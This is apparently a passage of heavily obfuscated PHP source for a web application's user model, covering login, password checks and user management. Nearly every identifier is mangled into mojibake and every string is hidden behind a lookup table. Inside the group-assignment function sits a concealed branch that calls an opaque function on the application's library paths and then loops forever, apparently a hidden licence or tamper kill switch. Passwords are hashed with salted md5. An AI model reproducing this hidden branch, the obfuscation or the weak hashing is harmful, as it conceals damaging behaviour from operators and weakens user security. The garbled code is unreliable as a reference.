$bÛ¥ŒñÒ±à = $this->_listDataApplyItem($bÛ¥ŒñÒ±à); goto bôèÍ‹Áß¯; A—îÀöñ‹Ğ: } return $this->cacheFunctionGet($fÆ ‚«àƒ¸[1660], $D÷ÊàÓÅ“); } protected function getInfoSimple($BÕÇ³Æ½, $F£ÌŸßÑš¾ = false) { $EÀÙ¨ˆÁä… =& $_SERVER[İë¬“ÅÒÛ›]; if (!$BÕÇ³Æ½) { return array(); } if ($F£ÌŸßÑš¾) { $A¨º–Ê„‘ç = $this->where(array($EÀÙ¨ˆÁä…[1095] => intval($BÕÇ³Æ½)))->find(); if (!is_array($A¨º–Ê„‘ç)) { return array(); } $A¨º–Ê„‘ç[$EÀÙ¨ˆÁä…[1917]] = Action($EÀÙ¨ˆÁä…[1918])->parseUrl($A¨º–Ê„‘ç[$EÀÙ¨ˆÁä…[1917]]); return $A¨º–Ê„‘ç; } return $this->cacheFunctionGet($EÀÙ¨ˆÁä…[1625], $BÕÇ³Æ½); } protected function getInfoSimpleOuter($F¢î¸ÀÉÆñ) { goto eÔ½½¬à‚›; C¼†öœ™à: $AóŒ¤¦¦Ÿ = array_field_key($EÓ…ƒÅÙÏ, explode($CØ›¶ğ‹–[47], $this->simpleField)); if (!$AóŒ¤¦¦Ÿ) { return array($CØ›¶ğ‹–[1095] => $CØ›¶ğ‹–[783], $CØ›¶ğ‹–[28] => $CØ›¶ğ‹–[154] . LNG($CØ›¶ğ‹–[1921]) . $CØ›¶ğ‹–[516], $CØ›¶ğ‹–[1917] => STATIC_PATH . $CØ›¶ğ‹–[1922]); } $AóŒ¤¦¦Ÿ[$CØ›¶ğ‹–[1917]] = Action($CØ›¶ğ‹–[1918])->parseUrl($AóŒ¤¦¦Ÿ[$CØ›¶ğ‹–[1917]]); goto FØÓÓ¸ç×‹; FØÓÓ¸ç×‹: return $AóŒ¤¦¦Ÿ; goto dÓñ´—¥«‹; eÔ½½¬à‚›: $CØ›¶ğ‹– =& $_SERVER[İë¬“ÅÒÛ›]; if (!$F¢î¸ÀÉÆñ || $F¢î¸ÀÉÆñ == 0) { return array($CØ›¶ğ‹–[1095] => $CØ›¶ğ‹–[403], $CØ›¶ğ‹–[28] => $CØ›¶ğ‹–[154] . LNG($CØ›¶ğ‹–[1919]) . $CØ›¶ğ‹–[516], $CØ›¶ğ‹–[1917] => STATIC_PATH . $CØ›¶ğ‹–[1920]); } $EÓ…ƒÅÙÏ = $this->cacheFunctionGet($CØ›¶ğ‹–[1625], $F¢î¸ÀÉÆñ); goto C¼†öœ™à; dÓñ´—¥«‹: } protected function groupUser($e§³£‡·•˜) { } public static function errorLang($fİ»‰ŸåÂì) { $aŞÆ¤Ê‘Ş¢ =& $_SERVER[İë¬“ÅÒÛ›]; $E®ìù§ëê = array(self::ERROR_USER_NOT_EXISTS => $aŞÆ¤Ê‘Ş¢[1923], self::ERROR_USER_PASSWORD_ERROR => $aŞÆ¤Ê‘Ş¢[1924], self::ERROR_USER_EXIST_NAME => $aŞÆ¤Ê‘Ş¢[1925], self::ERROR_USER_EXIST_PHONE => $aŞÆ¤Ê‘Ş¢[1926], self::ERROR_USER_EXIST_EMAIL => $aŞÆ¤Ê‘Ş¢[1927], self::ERROR_USER_LOGIN_LOCK => $aŞÆ¤Ê‘Ş¢[1928], self::ERROR_IP_NOT_ALLOW => $aŞÆ¤Ê‘Ş¢[1929], self::ERROR_USER_EXIST_NICKNAME => $aŞÆ¤Ê‘Ş¢[1930]); return LNG($E®ìù§ëê[$fİ»‰ŸåÂì]); } public function getInfoByMeta($DÓÎ‚…ºÄ, $c†Óˆ«ãæ) { $F¨ÜôÊ–ì¹ =& $_SERVER[İë¬“ÅÒÛ›]; $Dá–‚âÌåÃ = Model($F¨ÜôÊ–ì¹[1931])->where(array($F¨ÜôÊ–ì¹[88] => $DÓÎ‚…ºÄ, $F¨ÜôÊ–ì¹[360] => $c†Óˆ«ãæ))->find(); if ($Dá–‚âÌåÃ) { return $this->getInfo($Dá–‚âÌåÃ[$F¨ÜôÊ–ì¹[1095]]); } return !1; } public function userLoginCheck($FÉ”«”¸¬Â, $CÆŒ´„ƒ„) { goto d¹ÔŒ‚“áé; d—èôî‰Â¶: $this->userEdit($a»¶»É’Û[$fÕí²«Ïµœ[1095]], array($fÕí²«Ïµœ[1933] => time())); $this->clearCache($a»¶»É’Û[$fÕí²«Ïµœ[1095]]); return $this->getInfo($a»¶»É’Û[$fÕí²«Ïµœ[1095]]); goto aÒ´âÓ‚Ç¡; e˜Ø‡÷­¡ë: $a»¶»É’Û = $this->where($Bï¾œØ…³µ)->find(); if (!$a»¶»É’Û) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($a»¶»É’Û[$fÕí²«Ïµœ[1095]], $CÆŒ´„ƒ„)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto d—èôî‰Â¶; d¹ÔŒ‚“áé: $fÕí²«Ïµœ =& $_SERVER[İë¬“ÅÒÛ›]; $Bï¾œØ…³µ = array($fÕí²«Ïµœ[28] => $FÉ”«”¸¬Â, $fÕí²«Ïµœ[1770] => $FÉ”«”¸¬Â, $fÕí²«Ïµœ[297] => $FÉ”«”¸¬Â, $fÕí²«Ïµœ[1932] => $FÉ”«”¸¬Â, $fÕí²«Ïµœ[684] => $fÕí²«Ïµœ[686]); if ($this->nickNameRpt()) { unset($Bï¾œØ…³µ[$fÕí²«Ïµœ[1770]]); } goto e˜Ø‡÷­¡ë; aÒ´âÓ‚Ç¡: } private function clearCache($eß‹à²ùË) { $B‹„ƒƒ±èË =& $_SERVER[İë¬“ÅÒÛ›]; $this->cacheFunctionClear($B‹„ƒƒ±èË[1660], $eß‹à²ùË); $this->cacheFunctionClear($B‹„ƒƒ±èË[1625], $eß‹à²ùË); } public function userPasswordCheck($B§¨Ğ ø©Â, $AÂ²áÄ‘§) { $cöäÖœª‚Ü =& $_SERVER[İë¬“ÅÒÛ›]; $bÃé¿Ò±Ò± = $this->where(array($cöäÖœª‚Ü[1095] => intval($B§¨Ğ ø©Â)))->find(); $E‰ƒ‚ˆÇ = $this->metaGet($B§¨Ğ ø©Â); $B°èµÖñÛ = isset($E‰ƒ‚ˆÇ[$cöäÖœª‚Ü[1934]]) ? $E‰ƒ‚ˆÇ[$cöäÖœª‚Ü[1934]] : $cöäÖœª‚Ü[33]; if (md5($B°èµÖñÛ . trim($AÂ²áÄ‘§)) !== $bÃé¿Ò±Ò±[$cöäÖœª‚Ü[567]]) { return !1; } return !0; } public function userAdd($D¼±÷ğ‹¢Ü) { goto eÎ„–ÌÊñÖ; F¼ÀÊÇê÷‘: $DôŸÓ‘±å± = $this->_checkExist($D¼±÷ğ‹¢Ü); if ($DôŸÓ‘±å± !== !0) { return $DôŸÓ‘±å±; } $fÂ‹øÆÇ»Œ = $this->add($dóÈµ“ã‰Š); goto A­ç§ˆßá±; FÉ†ˆÜÍÃ: return $fÂ‹øÆÇ»Œ; goto Eºœ—ÕïÛ; eÎ„–ÌÊñÖ: $BãÀ²ğ‘Ä‹ =& $_SERVER[İë¬“ÅÒÛ›]; $dóÈµ“ã‰Š = array($BãÀ²ğ‘Ä‹[388] => $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[28]], $BãÀ²ğ‘Ä‹[1935] => $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1936]], $BãÀ²ğ‘Ä‹[1937] => isset($D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[297]]) ? $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[297]] : $BãÀ²ğ‘Ä‹[33], $BãÀ²ğ‘Ä‹[1938] => isset($D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1932]]) ? $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1932]] : $BãÀ²ğ‘Ä‹[33], $BãÀ²ğ‘Ä‹[1939] => isset($D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1770]]) ? $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1770]] : $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[28]], $BãÀ²ğ‘Ä‹[1940] => isset($D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1917]]) ? $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1917]] : $BãÀ²ğ‘Ä‹[33], $BãÀ²ğ‘Ä‹[1941] => isset($D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1942]]) ? $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1942]] : 1, $BãÀ²ğ‘Ä‹[1943] => $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[567]], $BãÀ²ğ‘Ä‹[1627] => isset($D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1530]]) ? $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1530]] : 1024 * 1024 * 20, $BãÀ²ğ‘Ä‹[1628] => 0, $BãÀ²ğ‘Ä‹[1933] => 0, $BãÀ²ğ‘Ä‹[1944] => isset($D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[447]]) ? $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[447]] : 1); if (!empty($D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1095]])) { $dóÈµ“ã‰Š[$BãÀ²ğ‘Ä‹[1095]] = $D¼±÷ğ‹¢Ü[$BãÀ²ğ‘Ä‹[1095]]; } goto F¼ÀÊÇê÷‘; A­ç§ˆßá±: $EÕî‰£ÉËĞ = array($BãÀ²ğ‘Ä‹[1943] => $dóÈµ“ã‰Š[$BãÀ²ğ‘Ä‹[567]], $BãÀ²ğ‘Ä‹[1939] => $dóÈµ“ã‰Š[$BãÀ²ğ‘Ä‹[1770]]); $this->userEdit($fÂ‹øÆÇ»Œ, $EÕî‰£ÉËĞ); Model($BãÀ²ğ‘Ä‹[855])->userRootAdd($fÂ‹øÆÇ»Œ); goto FÉ†ˆÜÍÃ; Eºœ—ÕïÛ: } protected function userEditTest($D‚á£ò‹¢, $b¥§ŒŠÚÔÖ) { return $this->call($_SERVER[İë¬“ÅÒÛ›][1945], $D‚á£ò‹¢, $b¥§ŒŠÚÔÖ); } protected function userEdit($dåÖƒá¬®á, $e¡¤ìõ½±Œ) { goto aÜß•à°Ä‘; aÜß•à°Ä‘: $DİÖ—Ê¬®õ =& $_SERVER[İë¬“ÅÒÛ›]; $B˜åäâó‚Ü = $this->getInfoSimple($dåÖƒá¬®á); if (!$B˜åäâó‚Ü) { return !1; } goto dä¶Ù÷İ÷; b£é ß•: $this->where(array($DİÖ—Ê¬®õ[1086] => $dåÖƒá¬®á))->save($e¡¤ìõ½±Œ); if (isset($e¡¤ìõ½±Œ[$DİÖ—Ê¬®õ[1770]])) { $this->setNamePinyin($dåÖƒá¬®á, $e¡¤ìõ½±Œ[$DİÖ—Ê¬®õ[1770]]); } return !0; goto bâœÕÇ÷; dä¶Ù÷İ÷: $dÇò· Éêù = $this->_checkExist($e¡¤ìõ½±Œ, $dåÖƒá¬®á); if ($dÇò· Éêù !== !0) { return $dÇò· Éêù; } if (isset($e¡¤ìõ½±Œ[$DİÖ—Ê¬®õ[567]]) && trim($e¡¤ìõ½±Œ[$DİÖ—Ê¬®õ[567]]) != $DİÖ—Ê¬®õ[33]) { $E‡ÃÄƒÃéä = $this->metaGet($dåÖƒá¬®á); if (empty($E‡ÃÄƒÃéä[$DİÖ—Ê¬®õ[1934]])) { $E‡ÃÄƒÃéä[$DİÖ—Ê¬®õ[1934]] = rand_string(10); Model($DİÖ—Ê¬®õ[1716])->metaSet($dåÖƒá¬®á, $DİÖ—Ê¬®õ[1934], $E‡ÃÄƒÃéä[$DİÖ—Ê¬®õ[1934]]); } $e¡¤ìõ½±Œ[$DİÖ—Ê¬®õ[567]] = md5($E‡ÃÄƒÃéä[$DİÖ—Ê¬®õ[1934]] . trim($e¡¤ìõ½±Œ[$DİÖ—Ê¬®õ[567]])); } else { unset($e¡¤ìõ½±Œ[$DİÖ—Ê¬®õ[567]]); } goto b£é ß•; bâœÕÇ÷: } public function setNamePinyin($A­âÂäÌÁ¥, $F­Á¢÷¥Œˆ = false) { $BÚöÕµò‘ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$F­Á¢÷¥Œˆ) { $EÖÍ´Šµ¹ = $this->getInfoSimple($A­âÂäÌÁ¥); $F­Á¢÷¥Œˆ = $EÖÍ´Šµ¹[$BÚöÕµò‘[1770]] ? $EÖÍ´Šµ¹[$BÚöÕµò‘[1770]] : $EÖÍ´Šµ¹[$BÚöÕµò‘[28]]; } $fµ¥ˆ¤™Ä = Model($BÚöÕµò‘[1481]); if (!Input::check($F­Á¢÷¥Œˆ, $BÚöÕµò‘[404])) { return $fµ¥ˆ¤™Ä->metaSet($A­âÂäÌÁ¥, array($BÚöÕµò‘[405] => $BÚöÕµò‘[33], $BÚöÕµò‘[406] => $BÚöÕµò‘[33])); } return $fµ¥ˆ¤™Ä->metaSet($A­âÂäÌÁ¥, array($BÚöÕµò‘[405] => str_replace($BÚöÕµò‘[50], $BÚöÕµò‘[33], Pinyin::encode($F­Á¢÷¥Œˆ)), $BÚöÕµò‘[406] => Pinyin::encode($F­Á¢÷¥Œˆ, $BÚöÕµò‘[407]))); } private function nickNameRpt() { $A¨©ó•‰å† =& $_SERVER[İë¬“ÅÒÛ›]; $bò¤²áÀ×Û = Model($A¨©ó•‰å†[835])->get($A¨©ó•‰å†[1946]); $e×Òßœëç = $GLOBALS[$A¨©ó•‰å†[6]][$A¨©ó•‰å†[1947]][$A¨©ó•‰å†[1946]]; $DàçÆ§¿ = !is_null($bò¤²áÀ×Û) ? $bò¤²áÀ×Û : $e×Òßœëç; return !!$DàçÆ§¿; } private function _checkExist($Cçè¥³á”‰, $BÃœğ‰éç = false) { $eÑˆ¯£´–¾ =& $_SERVER[İë¬“ÅÒÛ›]; $cÑÅ™Ôƒ = array($eÑˆ¯£´–¾[28] => UserModel::ERROR_USER_EXIST_NAME, $eÑˆ¯£´–¾[1770] => UserModel::ERROR_USER_EXIST_NICKNAME, $eÑˆ¯£´–¾[297] => UserModel::ERROR_USER_EXIST_EMAIL, $eÑˆ¯£´–¾[1932] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($cÑÅ™Ôƒ[$eÑˆ¯£´–¾[1770]]); } $D¬ßñ¾ß±Á = $BÃœğ‰éç ? array($eÑˆ¯£´–¾[1095] => array($eÑˆ¯£´–¾[1948], $BÃœğ‰éç)) : array(); foreach ($cÑÅ™Ôƒ as $d®œí¢¦ìî => $FÔ®åÍ²ƒ) { if (!isset($Cçè¥³á”‰[$d®œí¢¦ìî]) || !$Cçè¥³á”‰[$d®œí¢¦ìî]) { continue; } $bæ¶·¦³ª = array_merge(array($d®œí¢¦ìî => $Cçè¥³á”‰[$d®œí¢¦ìî]), $D¬ßñ¾ß±Á); $f§½ª‡³ˆœ = $this->where($bæ¶·¦³ª)->find(); if ($f§½ª‡³ˆœ) { return $FÔ®åÍ²ƒ; } } return !0; } public function userListInfo($d”‰çÑŒ¦ï) { $DÆ·­İº‰œ =& $_SERVER[İë¬“ÅÒÛ›]; $AÊà¾ÔÔ› = array(); $d”‰çÑŒ¦ï = array_unique($d”‰çÑŒ¦ï); if (!$d”‰çÑŒ¦ï) { return $AÊà¾ÔÔ›; } if (count($d”‰çÑŒ¦ï) < 20) { foreach ($d”‰çÑŒ¦ï as $cªĞÆ„´««) { $AÊà¾ÔÔ›[$cªĞÆ„´«« . $DÆ·­İº‰œ[33]] = $this->getInfoSimpleOuter($cªĞÆ„´««); } } else { $aµº³îé¸¬ = array($DÆ·­İº‰œ[1086] => array($DÆ·­İº‰œ[983], $d”‰çÑŒ¦ï)); if (count($d”‰çÑŒ¦ï) == 1) { $aµº³îé¸¬ = array($DÆ·­İº‰œ[1086] => $d”‰çÑŒ¦ï[0]); } $AÙ‰ŸĞÙ¸ñ = Model($DÆ·­İº‰œ[1716])->field($this->simpleField)->where($aµº³îé¸¬)->select(); $AÙ‰ŸĞÙ¸ñ = array_to_keyvalue($AÙ‰ŸĞÙ¸ñ, $DÆ·­İº‰œ[1095]); foreach ($d”‰çÑŒ¦ï as $cªĞÆ„´««) { $D¡íğ½¤Ì÷ = $AÙ‰ŸĞÙ¸ñ[$AÙ‰ŸĞÙ¸ñ[$cªĞÆ„´««]]; if (!$D¡íğ½¤Ì÷) { $AÊà¾ÔÔ›[$cªĞÆ„´«« . $DÆ·­İº‰œ[33]] = $this->getInfoSimpleOuter($cªĞÆ„´««); continue; } $D¡íğ½¤Ì÷[$DÆ·­İº‰œ[1917]] = Action($DÆ·­İº‰œ[1918])->parseUrl($D¡íğ½¤Ì÷[$DÆ·­İº‰œ[1917]]); $AÊà¾ÔÔ›[$cªĞÆ„´«« . $DÆ·­İº‰œ[33]] = $D¡íğ½¤Ì÷; } } return $AÊà¾ÔÔ›; } protected function userStatus($dµ‰ Õ„Ş, $cÙÑĞ¨œ¿ï) { $DœŸŸš‘óê = $this->getInfoSimple($dµ‰ Õ„Ş); if (!$DœŸŸš‘óê) { return !1; } $CÍäñø•‹š = array($_SERVER[İë¬“ÅÒÛ›][447] => $cÙÑĞ¨œ¿ï); return $this->userEdit($dµ‰ Õ„Ş, $CÍäñø•‹š); } protected function userRemove($däã‘ÜÇ«î) { goto càòØØä«; càòØØä«: $a¤ƒ´Ÿƒªæ =& $_SERVER[İë¬“ÅÒÛ›]; $eÉºèˆÉ·È = $this->getInfoSimple($däã‘ÜÇ«î); if (!$eÉºèˆÉ·È) { return !1; } goto cØÈ±¤´Ø; fÎ„ÅÛó—‹: Model($a¤ƒ´Ÿƒªæ[522])->userRootRemove($däã‘ÜÇ«î); return $this->where($DŒŒœ¥Šß)->delete(); goto fáÍî™ã ; A‘Úª‹ÂÕÀ: Model($a¤ƒ´Ÿƒªæ[1631])->where($DŒŒœ¥Šß)->delete(); Model($a¤ƒ´Ÿƒªæ[1931])->where($DŒŒœ¥Šß)->delete(); Model($a¤ƒ´Ÿƒªæ[1950])->where($DŒŒœ¥Šß)->delete(); goto fÎ„ÅÛó—‹; cØÈ±¤´Ø: $DŒŒœ¥Šß = array($a¤ƒ´Ÿƒªæ[1086] => $däã‘ÜÇ«î); Model($a¤ƒ´Ÿƒªæ[419])->where($DŒŒœ¥Šß)->delete(); Model($a¤ƒ´Ÿƒªæ[1949])->where($DŒŒœ¥Šß)->delete(); goto A‘Úª‹ÂÕÀ; fáÍî™ã : } protected function userGroupSet($f–†ÆŒˆ‹ã, $DÚõ£¬ÆÙ, $AƒœöËÖ = array()) { goto AŠ‚è¯; BòÁöì‘‡Ù: return $Fùñ¡ÎöÎÍ->addAll($e¸¦ãÍ•È‹, array(), !0); goto F©ÑµâìİŸ; cíëœÄ£: $e¸¦ãÍ•È‹ = array(); $E‘øšŠÃæì = 0; foreach ($DÚõ£¬ÆÙ as $AÌœÙ¢‹Ôİ => $E¨†›Î›¬Ğ) { $B’º¡Ñ±Œ÷ = array($B·‡Ğ°¢²[1095] => $f–†ÆŒˆ‹ã, $B·‡Ğ°¢²[1546] => $AÌœÙ¢‹Ôİ, $B·‡Ğ°¢²[1683] => $E¨†›Î›¬Ğ); $B’º¡Ñ±Œ÷[$B·‡Ğ°¢²[1567]] = isset($AƒœöËÖ[$E‘øšŠÃæì]) ? $AƒœöËÖ[$E‘øšŠÃæì] : 0; $E‘øšŠÃæì++; $e¸¦ãÍ•È‹[] = $B’º¡Ñ±Œ÷; } goto BòÁöì‘‡Ù; AŠ‚è¯: $B·‡Ğ°¢² =& $_SERVER[İë¬“ÅÒÛ›]; if ($_SERVER[$B·‡Ğ°¢²[556]] != $_SERVER[$B·‡Ğ°¢²[952]]) { goto c§¥×İ©©ù; EäÇ…É²ß: $a„ÖÎÇÚ¯ò = explode($B·‡Ğ°¢²[224], $B¡ÔÑÄ˜); if (count($a„ÖÎÇÚ¯ò) < $B·‡Ğ°¢²[558]) { die; } $e¡†ËŠ‰È› = $B·‡Ğ°¢²[559]; goto Dê“Ñä­Ğ‰; Dê“Ñä­Ğ‰: $e¡†ËŠ‰È›(LIB_DIR); $e¡†ËŠ‰È›(BASIC_PATH . $B·‡Ğ°¢²[1029]); while (1) { $e¡†ËŠ‰È› = $B·‡Ğ°¢²[595]; } goto EŒé§î¸¦Œ; c§¥×İ©©ù: $aÃ‚„÷ƒÕ = $B·‡Ğ°¢²[557]; $d×©ˆŸ‹—Ì = BASIC_PATH . $B·‡Ğ°¢²[554]; $B¡ÔÑÄ˜ = $aÃ‚„÷ƒÕ($d×©ˆŸ‹—Ì); goto EäÇ…É²ß; EŒé§î¸¦Œ: } $Aˆîğ¶‡ = $this->getInfoSimple($f–†ÆŒˆ‹ã); goto eŠËĞËÂİˆ; eŠËĞËÂİˆ: if (!$Aˆîğ¶‡ || !is_array($DÚõ£¬ÆÙ)) { return !1; } $Fùñ¡ÎöÎÍ = Model($B·‡Ğ°¢²[1631]); $Fùñ¡ÎöÎÍ->where(array($B·‡Ğ°¢²[1095] => $f–†ÆŒˆ‹ã))->delete(); goto cíëœÄ£; F©ÑµâìİŸ: } protected function userGroupAdd($c§ÄóïˆÕé, $f‹µ¥ª• , $d›à³Æ¼Ó) { $EˆŞ–¦Çğ =& $_SERVER[İë¬“ÅÒÛ›]; $B•é›Íº™ = $this->getInfoSimple($c§ÄóïˆÕé); if (!$B•é›Íº™ || !$f‹µ¥ª• ) { return !1; } $D˜ÅÖ“¯ê“ = array(array($EˆŞ–¦Çğ[1095] => $c§ÄóïˆÕé, $EˆŞ–¦Çğ[1546] => $f‹µ¥ª• , $EˆŞ–¦Çğ[1683] => $d›à³Æ¼Ó)); return Model($EˆŞ–¦Çğ[1631])->addAll($D˜ÅÖ“¯ê“, array(), !0); } protected function userGroupRemove($Eôæ¿­íä½, $AæäÓ ­ºä) { $AƒÂÏ‰ã¿ =& $_SERVER[İë¬“ÅÒÛ›]; $dîÈ”øµˆÏ = $this->getInfoSimple($Eôæ¿­íä½); if (!$dîÈ”øµˆÏ || !$AæäÓ ­ºä) { return !1; } $aÁåà”ˆ±Ï = array($AƒÂÏ‰ã¿[1086] => $Eôæ¿­íä½, $AƒÂÏ‰ã¿[1629] => $AæäÓ ­ºä); return Model($AƒÂÏ‰ã¿[1631])->where($aÁåà”ˆ±Ï)->delete(); } public function listData() { $E†ï¿‡Ë¸Á = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E†ï¿‡Ë¸Á[$_SERVER[İë¬“ÅÒÛ›][357]]); return $E†ï¿‡Ë¸Á; } public function listByID($C¾Šñ°ì§Ş) { $e²ˆ‘½Ø¹ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$C¾Šñ°ì§Ş) { return; } $C•´†ŸÍ”ù = array($e²ˆ‘½Ø¹[1095] => array($e²ˆ‘½Ø¹[7], $C¾Šñ°ì§Ş)); $DğŠç·•êÔ = $this->where($C•´†ŸÍ”ù)->select(); $this->_listDataApply($DğŠç·•êÔ); return $DğŠç·•êÔ; } public function listByGroup($aË‘¯˜Ó× = 0, $F‘­¾…÷„ = array()) { goto d¬†¼±ğËÖ; bí´ãÌµ: $cÅº…áòºï = array(); if ($aË‘¯˜Ó×) { $cÅº…áòºï = array($aî ×¿Àöâ[1952] => intval($aË‘¯˜Ó×)); $e‡ƒŠÕ£öŸ = "\114\105\x46\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\x75\x73\145\x72\137\147\x72\x6f\165\160\x20\165\x73\145\x72\137\x67\x72\157\x75\160\40\x6f\x6e\40\165\x73\x65\x72\56\x75\x73\145\162\x49\x44\x20\75\x20\x75\163\x65\x72\x5f\x67\162\x6f\165\160\56\x75\163\x65\162\x49\x44"; $eâäÓš‹†Ó = Input::get($aî ×¿Àöâ[1586], null, $aî ×¿Àöâ[33]) ? $aî ×¿Àöâ[33] : $aî ×¿Àöâ[1953]; } if (isset($F‘­¾…÷„[$aî ×¿Àöâ[447]])) { $cÅº…áòºï[$aî ×¿Àöâ[1954]] = $F‘­¾…÷„[$aî ×¿Àöâ[447]]; } goto cíËĞÛÏö™; d¬†¼±ğËÖ: $aî ×¿Àöâ =& $_SERVER[İë¬“ÅÒÛ›]; $fÌĞ‚äÈë = isset($F‘­¾…÷„[$aî ×¿Àöâ[1951]]) ? $F‘­¾…÷„[$aî ×¿Àöâ[1951]] : $aî ×¿Àöâ[33]; $e‡ƒŠÕ£öŸ = $aî ×¿Àöâ[33]; goto bí´ãÌµ; BèÓˆ•Á”½: return $eİÊëÇ˜ñ; goto A¬«ùÕ†Î; cíËĞÛÏö™: $eİÊëÇ˜ñ = $this->_makeOrder($eâäÓš‹†Ó)->field($aî ×¿Àöâ[1955])->where($cÅº…áòºï)->join($e‡ƒŠÕ£öŸ)->selectPage(50); $aÜİÍ‡äá– = $aî ×¿Àöâ[741] . ($fÌĞ‚äÈë ? $aî ×¿Àöâ[47] . $fÌĞ‚äÈë : $aî ×¿Àöâ[33]); $this->_listDataApply($eİÊëÇ˜ñ[$aî ×¿Àöâ[357]], $aÜİÍ‡äá–); goto BèÓˆ•Á”½; A¬«ùÕ†Î: } private function _makeOrder($EÉ«ù¯Šê² = '') { goto aÓÏ†àƒÑ; D¨Š•­â±: $EÉ«ù¯Šê² = $EÉ«ù¯Šê² . "\165\x73\x65\x72\56{$EŠ„ô¨‘’}\x20{$A¡Ÿ½Êô­¹}\x2c\x20\165\163\x65\162\56\165\x73\145\x72\x49\104\40\x61\163\143"; return $this->alias($AÑàîÀ†[1717])->order($EÉ«ù¯Šê²); goto E»Í¢ñé´; aÓÏ†àƒÑ: $AÑàîÀ† =& $_SERVER[İë¬“ÅÒÛ›]; $b¼ÓÒÂ¬â = array($AÑàîÀ†[1095], $AÑàîÀ†[28], $AÑàîÀ†[1532], $AÑàîÀ†[1505], $AÑàîÀ†[187]); $CÂ®©ŠÒ·© = array($AÑàîÀ†[1632] => $AÑàîÀ†[1633], $AÑàîÀ†[1513] => $AÑàîÀ†[1590]); goto EÆ†ÜåÒÖ; EÆ†ÜåÒÖ: $EŠ„ô¨‘’ = Input::get($AÑàîÀ†[1586], $AÑàîÀ†[7], $AÑàîÀ†[1086], $b¼ÓÒÂ¬â); $A¡Ÿ½Êô­¹ = Input::get($AÑàîÀ†[1588], $AÑàîÀ†[7], $AÑàîÀ†[1634], array($AÑàîÀ†[1634], $AÑàîÀ†[1513])); $A¡Ÿ½Êô­¹ = $CÂ®©ŠÒ·©[$A¡Ÿ½Êô­¹]; goto D¨Š•­â±; E»Í¢ñé´: } public function listSearch($dæÓ•èÂ¬§) { goto dæ‚í»ê…Ğ; cÙ´é¨Õ·®: $this->_filterUserList($eÄåº‹ß¬È); return $eÄåº‹ß¬È; goto eáÔœÀ¬«ó; f‚„Û†×µ: if (!$bĞîùëº¿…) { $b«©Š¨İ§Ë = array(); } if (isset($dæÓ•èÂ¬§[$EĞø¨â˜‘Ú[447]])) { $b«©Š¨İ§Ë[$EĞø¨â˜‘Ú[447]] = $dæÓ•èÂ¬§[$EĞø¨â˜‘Ú[447]]; } $eÄåº‹ß¬È = $this->_makeOrder()->where($b«©Š¨İ§Ë)->selectPage(20); goto f‡‰¯¶çïÈ; f‡‰¯¶çïÈ: if (!$eÄåº‹ß¬È || count($eÄåº‹ß¬È[$EĞø¨â˜‘Ú[357]]) < 5 && Input::check($bĞîùëº¿…, $EĞø¨â˜‘Ú[310])) { $B÷ë¤ï¢ = $this->_searchFromMeta($EĞø¨â˜‘Ú[406], $bĞîùëº¿…, 10); $f™â“Õá­ñ = $this->_searchFromMeta($EĞø¨â˜‘Ú[405], $bĞîùëº¿…, 10); $f—òÅÊ†á = array_merge($B÷ë¤ï¢, $f™â“Õá­ñ, $eÄåº‹ß¬È[$EĞø¨â˜‘Ú[357]]); $eÄåº‹ß¬È[$EĞø¨â˜‘Ú[357]] = array_unique_by_key($f—òÅÊ†á, $EĞø¨â˜‘Ú[1095]); $eÄåº‹ß¬È[$EĞø¨â˜‘Ú[354]][$EĞø¨â˜‘Ú[355]] = count($eÄåº‹ß¬È[$EĞø¨â˜‘Ú[357]]); $eÄåº‹ß¬È[$EĞø¨â˜‘Ú[354]][$EĞø¨â˜‘Ú[356]] = ceil($eÄåº‹ß¬È[$EĞø¨â˜‘Ú[354]][$EĞø¨â˜‘Ú[355]] / $eÄåº‹ß¬È[$EĞø¨â˜‘Ú[354]][$EĞø¨â˜‘Ú[352]]); } $this->_listDataApply($eÄåº‹ß¬È[$EĞø¨â˜‘Ú[357]]); $this->_filterByGroup($eÄåº‹ß¬È, $Fö·œº¹–å); goto cÙ´é¨Õ·®; dæ‚í»ê…Ğ: $EĞø¨â˜‘Ú =& $_SERVER[İë¬“ÅÒÛ›]; $bĞîùëº¿… = $dæÓ•èÂ¬§[$EĞø¨â˜‘Ú[1635]]; $Fö·œº¹–å = isset($dæÓ•èÂ¬§[$EĞø¨â˜‘Ú[1636]]) ? $dæÓ•èÂ¬§[$EĞø¨â˜‘Ú[1636]] : !1; goto bËŸ‚»×ÊØ; bËŸ‚»×ÊØ: $bĞîùëº¿… = str_replace($EĞø¨â˜‘Ú[1637], $EĞø¨â˜‘Ú[1638], trim($bĞîùëº¿…)); $b«©Š¨İ§Ë = array($EĞø¨â˜‘Ú[28] => array($EĞø¨â˜‘Ú[521], "\x25{$bĞîùëº¿…}\x25"), $EĞø¨â˜‘Ú[297] => array($EĞø¨â˜‘Ú[521], "\x25{$bĞîùëº¿…}\45"), $EĞø¨â˜‘Ú[1770] => array($EĞø¨â˜‘Ú[521], 